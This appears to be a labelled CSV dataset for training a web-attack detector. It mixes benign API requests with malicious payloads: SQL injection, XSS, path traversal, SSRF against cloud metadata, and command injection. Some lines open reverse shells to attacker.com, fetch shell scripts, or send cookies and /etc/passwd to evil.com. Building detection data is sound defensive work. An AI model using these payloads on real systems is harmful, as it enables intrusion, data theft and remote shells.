"text","label"
"username=administrator&password=monkey","1"
"description=<svg/onload=alert(1)>","1"
"<details open ontoggle=alert(1)>","1"
"GET /health HTTP/1.1","0"
"search=' OR 1=1 LIMIT 1--","1"
"DELETE /api/login User-Agent: PostmanRuntime/7.36.0","0"
"order_id=ORD-4749 status=confirmed","0"
"username=admin&password=password","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"id=' OR 1=1--","1"
"GET /console HTTP/1.1","1"
"page=43&limit=10","0"
"GET /settings/410","0"
"GET /api/users?id=1 UNION SELECT user(),database()--","1"
"search=tablet","0"
"category=audio page=3","0"
"GET /api/users?id=1' /*!OR*/ 1=1--","1"
"cmd=; ping -c 4 attacker.com","1"
"{""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"search=phone","0"
"GET /api/users?limit=20&offset=0","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"search=tablet","0"
"GET ....//....//etc/passwd","1"
"GET /profile/9238","0"
"<video src=1 onerror=alert(1)>","1"
"GET /health HTTP/1.1","0"
"GET /web.config HTTP/1.1","1"
"user_id=315&action=view","0"
"POST /api/data body=command; cat /etc/shadow","1"
"POST /api/orders body={""search"": ""wireless headphones"", ""in_stock"": true}","0"
"username=1' AND 1=1 UNION SELECT 1-- -","1"
"javascript:alert(1)","1"
"url=dict://127.0.0.1:11211/","1"
"limit=20&offset=0","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"brute force attempt on login endpoint from single ip","1"
"multiple failed login attempts detected for admin","1"
"search=tablet","0"
"id=' OR 1=1 LIMIT 1--","1"
"exec=; ping -c 4 attacker.com","1"
"user=ahmed&filter=active","0"
"message=<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"POST /api/orders?user=ahmed&filter=active","0"
"search=laptop&sort=price","0"
"filename=`id`","1"
"category=electronics&page=1","0"
"POST /dashboard body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"username=admin&password=monkey","1"
"user=ahmed&filter=active","0"
"page=28&limit=10","0"
"GET /api/users/4901","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"page=7&limit=20","0"
"category=phones page=1","0"
"comment=';alert(String.fromCharCode(88,83,83))//","1"
"title=<script>alert('XSS')</script>","1"
"DELETE /settings User-Agent: python-requests/2.31.0","0"
"username=admin&password=batman","1"
"url=http://10.0.0.1","1"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"search=phone","0"
"PUT /api/data User-Agent: python-requests/2.31.0","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"GET /api/search/6690","0"
"username=admin&password=letmein","1"
"GET /settings User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"GET /health HTTP/1.1","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"exec=| wget http://attacker.com/shell.sh","1"
"cmd=|| nc -e /bin/sh attacker.com 4444","1"
"POST /settings?category=electronics&page=1","0"
"GET /health HTTP/1.1","0"
"DELETE /api/users?date=2024-01-15&type=order","0"
"password spray attack detected multiple users","1"
"PUT /settings?q=smartphone&brand=samsung","0"
"url=http://localhost:8080","1"
"DELETE /profile?search=laptop&sort=price","0"
"$(whoami)","1"
"message=""><script>alert(1)</script>","1"
"name=<script>new Image().src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>","1"
"ping=| cat /etc/passwd","1"
"username=administrator&password=qwerty","1"
"comment=<body onload=alert(1)>","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"url=dict://127.0.0.1:11211/","1"
"search=' UNION SELECT NULL--","1"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"User-Agent: masscan/1.3","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /.env HTTP/1.1","1"
"order_id=ORD-6504 status=confirmed","0"
"GET ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"include=../../../.env","1"
"DELETE /api/orders?id=123&format=json","0"
"limit=20&offset=0","0"
"brute force attempt on login endpoint from single ip","1"
"name=Omar email=934@mail.com","0"
"exec=|| nc -e /bin/sh attacker.com 4444","1"
"DELETE /api/orders?category=electronics&page=1","0"
"url=http://metadata.google.internal","1"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"{""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /api/users/8792","0"
"POST /api/data body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"include=php://filter/convert.base64-encode/resource=config.php","1"
"name=Lina email=225@mail.com","0"
"description=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"order_id=ORD-5522 status=confirmed","0"
"login attempt failed username admin invalid credentials","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"username=administrator&password=superman","1"
"username=administrator&password=admin","1"
"User-Agent: masscan/1.3","1"
"name=Nour email=363@mail.com","0"
"host=$(curl -s http://attacker.com/shell.sh)","1"
"GET /phpmyadmin HTTP/1.1","1"
"PUT /api/login?date=2024-01-15&type=order","0"
"url=dict://127.0.0.1:11211/","1"
"username=root&password=123456","1"
"user_id=900&action=view","0"
"ping=$(curl -s http://attacker.com/shell.sh)","1"
"repeated authentication failure admin account locked","1"
"GET /wp-admin HTTP/1.1 User-Agent: sqlmap","1"
"GET /health HTTP/1.1","0"
"order_id=ORD-8208 status=confirmed","0"
"GET /dashboard?q=smartphone&brand=samsung","0"
"POST /api/orders User-Agent: python-requests/2.31.0","0"
"POST /api/login body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"id=' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--","1"
"page=50&limit=10","0"
"user=ahmed&filter=active","0"
"username=1' /*!OR*/ 1=1--","1"
"category=tablets page=3","0"
"PUT /api/search User-Agent: python-requests/2.31.0","0"
"multiple failed login attempts detected for admin","1"
"category=laptops page=5","0"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"filename=; curl http://evil.com/$(cat /etc/passwd | base64)","1"
"name=Nour email=972@mail.com","0"
"search=headphones","0"
"GET /settings/2692","0"
"password spray attack detected multiple users","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"host=|| nc -e /bin/sh attacker.com 4444","1"
"Authorization: Bearer validtoken912","0"
"include=../../../../var/log/apache2/access.log","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"q=smartphone&brand=samsung","0"
"category=audio page=9","0"
"order_id=ORD-2558 status=confirmed","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"brute force attempt on login endpoint from single ip","1"
"filename=& whoami","1"
"GET /health HTTP/1.1","0"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"title=<script >alert(1)</script >","1"
"Authorization: Bearer validtoken879","0"
"Content-Type: application/json {""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"Authorization: Bearer validtoken439","0"
"include=file:///etc/passwd","1"
"PUT /api/orders User-Agent: axios/1.6.0","0"
"GET /web.config HTTP/1.1","1"
"GET /health HTTP/1.1","0"
"username=administrator&password=batman","1"
"POST /api/products body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /api/search/6932","0"
"name=<input onfocus=alert(1) autofocus>","1"
"GET /health HTTP/1.1","0"
"name=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"name=javascript:alert(document.cookie)","1"
"eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"GET /config.php HTTP/1.1","1"
"name=<svg onload=alert(1)>","1"
"ping=| uname -a","1"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"Authorization: Bearer validtoken809","0"
"path=..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"comment=<svg><script>location='https://evil.com?c='+document.cookie</script></svg>","1"
"GET /api/search?q=<script>alert(document.cookie)</script>","1"
"password spray attack detected multiple users","1"
"description=<scr ipt>alert(1)</scr ipt>","1"
"page=17&limit=20","0"
"GET /api/search?q=<script>alert(1)</script>","1"
"GET /config.php HTTP/1.1","1"
"url=dict://127.0.0.1:11211/","1"
"exec=; python -c 'import socket,subprocess'","1"
"category=laptops page=1","0"
"POST /api/feedback body=<script >alert(1)</script >","1"
"PUT /api/search User-Agent: python-requests/2.31.0","0"
"url=http://127.0.0.1/admin","1"
"GET /dashboard/8682","0"
"POST /settings?category=electronics&page=1","0"
"user_id=860&action=view","0"
"order_id=ORD-5675 status=confirmed","0"
"url=http://10.0.0.1","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"search=phone","0"
"url=http://10.0.0.1","1"
"login attempt failed username admin invalid credentials","1"
"POST /api/data body=command; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"search=' OR ''='","1"
"GET /api/search?q=<<SCRIPT>alert('XSS');//<</SCRIPT>","1"
"GET /api/data/5436","0"
"order_id=1'||'1'='1","1"
"id=' OR 1=1#","1"
"include=../../.git/config","1"
"Authorization: Bearer validtoken318","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"POST /api/search body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET /api/login?status=pending&priority=high","0"
"exec=; python -c 'import socket,subprocess'","1"
"search=phone","0"
"title=<script>alert(1)</script>","1"
"username=root&password=letmein","1"
"search=laptop","0"
"DELETE /api/users User-Agent: axios/1.6.0","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"url=http://192.168.1.1","1"
"GET /api/search?q=<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"search=headphones","0"
"repeated authentication failure admin account locked","1"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"GET /api/users/6906","0"
"GET /api/products/5775","0"
"brute force attempt on login endpoint from single ip","1"
"order_id=ORD-3785 status=confirmed","0"
"search=<video src=1 onerror=alert(1)>","1"
"User-Agent: Nikto/2.5.0","1"
"exec=& net user hacker Password1 /add","1"
"POST /profile User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"order_id=1'%09OR%091=1--","1"
"user=ahmed&filter=active","0"
"GET /health HTTP/1.1","0"
"POST /api/login username=1'/**/OR/**/1=1-- password=test","1"
"Authorization: Bearer validtoken187","0"
"GET /api/search?q=<a href='javascript:alert(1)'>click</a>","1"
"date=2024-01-15&type=order","0"
"GET /console HTTP/1.1","1"
"GET /profile/5701","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"GET /api/search?q=javascript:alert(1)","1"
"url=http://127.0.0.1/admin","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /profile/952","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"../../../../etc/passwd","1"
"Authorization: Bearer validtoken577","0"
"User-Agent: Nikto/2.5.0","1"
"repeated authentication failure admin account locked","1"
"page=42&limit=50","0"
"username=user&password=qwerty","1"
"path=../../../../etc/shadow","1"
"Authorization: Bearer validtoken140","0"
"name=Lina email=634@mail.com","0"
"order_id=ORD-8242 status=confirmed","0"
"include=../../../../proc/self/environ","1"
"POST /api/feedback body=javascript:alert(document.cookie)","1"
"page=50&limit=20","0"
"url=http://10.0.0.1","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"GET /.git/config HTTP/1.1","1"
"GET /api/data/5861","0"
"POST /api/login username=' OR 1=1-- password=test","1"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"url=http://metadata.google.internal","1"
"page=36&limit=50","0"
"message=<img src=x onerror=alert(1)>","1"
"....//....//etc/passwd","1"
"DELETE /profile User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"POST /api/products User-Agent: PostmanRuntime/7.36.0","0"
"url=http://127.0.0.1/admin","1"
"password spray attack detected multiple users","1"
"GET /health HTTP/1.1","0"
"user_id=122&action=view","0"
"category=tablets page=4","0"
"page=14&limit=50","0"
"GET /console HTTP/1.1","1"
"GET /.env HTTP/1.1","1"
"GET /.env HTTP/1.1","1"
"order_id=ORD-1274 status=confirmed","0"
"page=3&limit=20","0"
"name=Ahmed email=813@mail.com","0"
"exec=`id`","1"
"user_id=795&action=view","0"
"repeated authentication failure admin account locked","1"
"POST /api/products body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"order_id=admin'--","1"
"POST /api/users User-Agent: python-requests/2.31.0","0"
"GET /api/search/3990","0"
"POST /api/login body={""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"User-Agent: masscan/1.3","1"
"user_id=250&action=view","0"
"GET /api/users?limit=20&offset=0","0"
"GET /config.php HTTP/1.1","1"
"user_id=633&action=view","0"
"filename=; ls -la","1"
"username=admin&password=monkey","1"
"url=file:///etc/passwd","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"search=1'/**/OR/**/1=1--","1"
"GET /health HTTP/1.1","0"
"Content-Type: application/json {""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"order_id=ORD-5218 status=confirmed","0"
"GET /health HTTP/1.1","0"
"title=<script>document.location='https://evil.com/steal?c='+document.cookie</script>","1"
"ping=; ping -c 4 attacker.com","1"
"name=Nour email=460@mail.com","0"
"Authorization: Bearer validtoken217","0"
"category=phones page=8","0"
"user_id=288&action=view","0"
"name=Sara email=256@mail.com","0"
"GET /health HTTP/1.1","0"
"GET /robots.txt scan probe reconnaissance","1"
"username=root&password=abc123","1"
"....//....//etc/passwd","1"
"GET /health HTTP/1.1","0"
"POST /api/products body={""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"url=http://192.168.1.1","1"
"order_id=ORD-4452 status=confirmed","0"
"Authorization: Bearer validtoken356","0"
"1; IF (1=1) WAITFOR DELAY '0:0:5'--","1"
"GET /api/files?name=..%2F..%2F..%2Fetc%2Fpasswd","1"
"GET /api/files?name=/etc/passwd%00","1"
"user_id=23&action=view","0"
"file=../../.git/config","1"
"Authorization: Bearer validtoken274","0"
"GET /backup.sql HTTP/1.1","1"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"Content-Type: application/json {""search"": ""wireless headphones"", ""in_stock"": true}","0"
"GET /.git/config HTTP/1.1","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"message=<img src='x' onerror='alert(1)'>","1"
"POST /api/login username=' OR '1'='1 password=test","1"
"GET /api/products/7321","0"
"GET ../../../../var/log/apache2/access.log","1"
"DELETE /api/products?status=pending&priority=high","0"
"POST /api/users?user=ahmed&filter=active","0"
"repeated authentication failure admin account locked","1"
"cmd=; cat /etc/shadow","1"
"User-Agent: Nikto/2.5.0","1"
"file=../../.git/config","1"
"user_id=171&action=view","0"
"category=electronics&page=1","0"
"POST /api/search?q=smartphone&brand=samsung","0"
"POST /api/data body=command$(whoami)","1"
"GET /backup.sql HTTP/1.1","1"
"GET /api/files?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"; python -c 'import socket,subprocess'","1"
"search=tablet","0"
"search=tablet","0"
"page=23&limit=10","0"
"POST /api/login username=' UNION SELECT username,password FROM users-- password=test","1"
"status=pending&priority=high","0"
"category=tablets page=10","0"
"comment=<ScRiPt>alert(1)</ScRiPt>","1"
"GET /settings/3110","0"
"GET /dashboard/6772","0"
"Authorization: Bearer validtoken848","0"
"name=Ahmed email=881@mail.com","0"
"id=123&format=json","0"
"POST /dashboard User-Agent: python-requests/2.31.0","0"
"GET /backup.sql HTTP/1.1","1"
"GET /health HTTP/1.1","0"
"url=file:///etc/passwd","1"
"GET /backup.sql HTTP/1.1","1"
"GET /health HTTP/1.1","0"
"{""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"category=laptops page=2","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/search?q=<ScRiPt>alert(1)</ScRiPt>","1"
"id=1 AND SLEEP(5)--","1"
"ping=`id`","1"
"POST /dashboard body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"search=tablet","0"
"Authorization: Bearer validtoken313","0"
"GET /web.config HTTP/1.1","1"
"url=http://localhost:8080","1"
"user=1 AND 1=CONVERT(int,@@version)--","1"
"username=user&password=123456","1"
"url=dict://127.0.0.1:11211/","1"
"page=29&limit=20","0"
"Content-Type: application/json {""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"user_id=120&action=view","0"
"Content-Type: application/json {""username"": ""ahmed_hassan"", ""password"": ""SecurePass123!""}","0"
"login attempt failed username admin invalid credentials","1"
"'; DELETE FROM orders WHERE 1=1--","1"
"user=ahmed&filter=active","0"
"<body onload=alert(1)>","1"
"repeated authentication failure admin account locked","1"
"{""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"order_id=ORD-7108 status=confirmed","0"
"POST /settings User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"user=ahmed&filter=active","0"
"title=<img src=x onerror=alert(1)>","1"
"search=' OR 1=1--","1"
"order_id=1 OR 1=1","1"
"GET ..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"url=dict://127.0.0.1:11211/","1"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"Authorization: Bearer validtoken219","0"
"search=laptop","0"
"page=45&limit=50","0"
"repeated authentication failure admin account locked","1"
"multiple failed login attempts detected for admin","1"
"GET ../../../etc/shadow","1"
"username=administrator&password=abc123","1"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"user=1 UNION SELECT 1,2,3--","1"
"search=headphones","0"
"order_id=ORD-7853 status=confirmed","0"
"name=Nour email=151@mail.com","0"
"user_id=903&action=view","0"
"fetch=http://internal-service:8080/secret","1"
"order_id=ORD-3551 status=confirmed","0"
"order_id=1 AND SLEEP(5)--","1"
"url=http://10.0.0.1","1"
"Authorization: Bearer validtoken867","0"
"GET /api/files?name=../../../etc/shadow","1"
"POST /api/data body=command$(curl -s http://attacker.com/shell.sh)","1"
"category=laptops page=10","0"
"title=%3Cscript%3Ealert(1)%3C/script%3E","1"
"GET /.git/config HTTP/1.1","1"
"order_id=ORD-5240 status=confirmed","0"
"DELETE /dashboard?limit=20&offset=0","0"
"page=28&limit=50","0"
"GET /web.config HTTP/1.1","1"
"exec=| wget http://attacker.com/shell.sh","1"
"GET /admin HTTP/1.1","1"
"name=Ahmed email=695@mail.com","0"
"search=phone","0"
"User-Agent: sqlmap/1.8.3#stable","1"
"order_id=ORD-7480 status=confirmed","0"
"username=admin&password=abc123","1"
"id=' OR '1'='1","1"
"POST /dashboard?user=ahmed&filter=active","0"
"id=' OR 1=1 INTO OUTFILE '/tmp/x'--","1"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"name=Nour email=42@mail.com","0"
"POST /api/feedback body=javascript:alert(document.cookie)","1"
"name=<IMG SRC=JaVaScRiPt:alert('XSS')>","1"
"path=../../../../etc/shadow","1"
"category=phones page=1","0"
"POST /dashboard body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"POST /api/search User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"POST /api/users body={""department"": ""IT"", ""full_name"": ""Omar Khalid"", ""phone"": ""01012345678""}","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"fetch=http://internal-service:8080/secret","1"
"POST /api/products?status=pending&priority=high","0"
"Authorization: Bearer validtoken339","0"
"username=user&password=1234567890","1"
"GET /api/login/2703","0"
"DELETE /api/products?q=smartphone&brand=samsung","0"
"name=Ahmed email=590@mail.com","0"
"User-Agent: masscan/1.3","1"
"order_id=ORD-9983 status=confirmed","0"
"url=http://127.0.0.1/admin","1"
"search=1' OR 0x31=0x31--","1"
"search=headphones","0"
"brute force attempt on login endpoint from single ip","1"
"name=Sara email=100@mail.com","0"
"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts","1"
"username=root&password=1234567890","1"
"GET /api/products/6544","0"
"url=http://127.0.0.1/admin","1"
"GET /settings User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"GET /dashboard/5102","0"
"Content-Type: application/json {""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET ../../../../proc/self/environ","1"
"GET /health HTTP/1.1","0"
"order_id=ORD-9335 status=confirmed","0"
"order_id=ORD-6496 status=confirmed","0"
"GET file:///etc/passwd","1"
"search=' OR 'x'='x","1"
"path=../../../var/www/html/config.php","1"
"GET /api/files?name=php://filter/convert.base64-encode/resource=config.php","1"
"search=1 OR 1=1","1"
"page=4&limit=20","0"
"date=2024-01-15&type=order","0"
"GET /dashboard?user=ahmed&filter=active","0"
"GET /api/orders User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","0"
"Authorization: Bearer validtoken625","0"
"search=phone","0"
"GET /health HTTP/1.1","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"POST /api/orders body={""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"GET /api/users?id=1 UNION SELECT @@version,NULL--","1"
"User-Agent: Nmap Scripting Engine","1"
"name=Omar email=821@mail.com","0"
"url=http://169.254.169.254/latest/meta-data/","1"
"GET /api/users?id=') OR ('1'='1","1"
"../../../../var/log/apache2/access.log","1"
"host=; python -c 'import socket,subprocess'","1"
"POST /api/data body=command| uname -a","1"
"url=http://192.168.1.1","1"
"search=<script>alert('XSS')</script>","1"
"GET /health HTTP/1.1","0"
"PUT /api/users User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"GET /profile?date=2024-01-15&type=order","0"
"GET /wp-admin HTTP/1.1","1"
"POST /api/products?limit=20&offset=0","0"
"date=2024-01-15&type=order","0"
"host=; ls -la","1"
"{""user_id"": 15, ""action"": ""view"", ""page"": ""dashboard""}","0"
"GET /health HTTP/1.1","0"
"message=<iframe srcdoc='<script>alert(1)</script>'></iframe>","1"
"GET /phpmyadmin HTTP/1.1","1"
"GET /api/products User-Agent: Mozilla/5.0 (Linux; Android 14; Pixel 8) Chrome/123.0.0.0","0"
"POST /api/products User-Agent: axios/1.6.0","0"
"user=1 AND 1=CONVERT(int,@@version)--","1"
"search=admin'--","1"
"name=Omar email=98@mail.com","0"
"repeated authentication failure admin account locked","1"
"GET /.git/config HTTP/1.1","1"
"GET /api/users?id=' OR ''='","1"
"url=http://192.168.1.1","1"
"Authorization: Bearer validtoken710","0"
"url=http://localhost:8080","1"
"..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts","1"
"name=Sara email=152@mail.com","0"
"page=29&limit=20","0"
"Authorization: Bearer validtoken513","0"
"description=eval(String.fromCharCode(97,108,101,114,116,40,49,41))","1"
"<body onload=alert(1)>","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"POST /api/orders body={""feedback"": ""Great product, fast delivery!"", ""rating"": 5}","0"
"DELETE /api/data?id=123&format=json","0"
"DELETE /profile User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15","0"
"exec=; ls -la","1"
"Authorization: Bearer validtoken305","0"
"cmd=& net user hacker Password1 /add","1"
"username=admin&password=admin123","1"
"GET %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","1"
"message=""><script>alert(1)</script>","1"
"Content-Type: application/json {""name"": ""Sara Ali"", ""email"": ""sara@company.com"", ""role"": ""user""}","0"
"search=tablet","0"
"name=Omar email=30@mail.com","0"
"Authorization: Bearer validtoken391","0"
"GET /health HTTP/1.1","0"
"POST /dashboard body={""category"": ""phones"", ""max_price"": 5000, ""brand"": ""Apple""}","0"
"repeated authentication failure admin account locked","1"
"POST /api/login username=1 UNION SELECT @@version,NULL-- password=test","1"
"user_id=373&action=view","0"
"GET /actuator/env HTTP/1.1","1"
"name=Ahmed email=475@mail.com","0"
"path=..%2F..%2F..%2Fetc%2Fpasswd","1"
"GET /api/products?date=2024-01-15&type=order","0"
"user_id=905&action=view","0"
"GET /api/products HTTP/1.1 Accept: application/json","0"
"GET /api/login/6368","0"
"GET /api/orders/4160","0"
"name=Ahmed email=100@mail.com","0"
"status=pending&priority=high","0"
"path=../../../var/www/html/config.php","1"
"title=<ScRiPt>alert(1)</ScRiPt>","1"
"path=../../../../etc/shadow","1"
"POST /dashboard body={""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"PUT /api/products?search=laptop&sort=price","0"
"path=../../../../var/log/apache2/access.log","1"
"description=<script>fetch('https://evil.com?c='+document.cookie)</script>","1"
"endpoint=http://localhost:9200/_cat/indices","1"
"POST /api/feedback body=<details open ontoggle=alert(1)>","1"
"multiple failed login attempts detected for admin","1"
"Authorization: Bearer validtoken440","0"
"Content-Type: application/json {""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"date=2024-01-15&type=order","0"
"GET /health HTTP/1.1","0"
"order_id=ORD-7381 status=confirmed","0"
"title=<svg/onload=alert(1)>","1"
"username=' UNION SELECT 1,table_name FROM information_schema.tables--","1"
"{""order_id"": ""ORD-2024-001"", ""status"": ""processing""}","0"
"search=headphones","0"
"description=<iframe src=javascript:alert(1)>","1"
"GET /api/users/402","0"
"<iframe src=javascript:alert(1)>","1"
"{""product_id"": 42, ""quantity"": 2, ""address"": ""Cairo, Egypt""}","0"
"GET /api/products?id=123&format=json","0"
"name=Omar email=249@mail.com","0"
"user_id=142&action=view","0"
"q=smartphone&brand=samsung","0"
"category=laptops page=2","0"
"GET /dashboard?category=electronics&page=1","0"
"status=pending&priority=high","0"
"; bash -i >& /dev/tcp/attacker.com/4444 0>&1","1"
"password spray attack detected multiple users","1"
"ping=$(whoami)","1"
"url=http://10.0.0.1","1"
"title=<scr ipt>alert(1)</scr ipt>","1"
"user_id=31&action=view","0"
"order_id=ORD-4290 status=confirmed","0"
"url=dict://127.0.0.1:11211/","1"
"GET /etc/passwd%00","1"
"category=tablets page=6","0"
"limit=20&offset=0","0"
"Authorization: Bearer validtoken267","0"
"GET /api/search/6484","0"
"include=../../../.env","1"
"search=headphones","0"
"GET /health HTTP/1.1","0"
"fetch=http://internal-service:8080/secret","1"
"password spray attack detected multiple users","1"
"{""message"": ""I need help with my order"", ""priority"": ""normal""}","0"
"password spray attack detected multiple users","1"
"GET /config.php HTTP/1.1","1"
"GET /api/swagger.json HTTP/1.1","1"
"url=http://10.0.0.1","1"
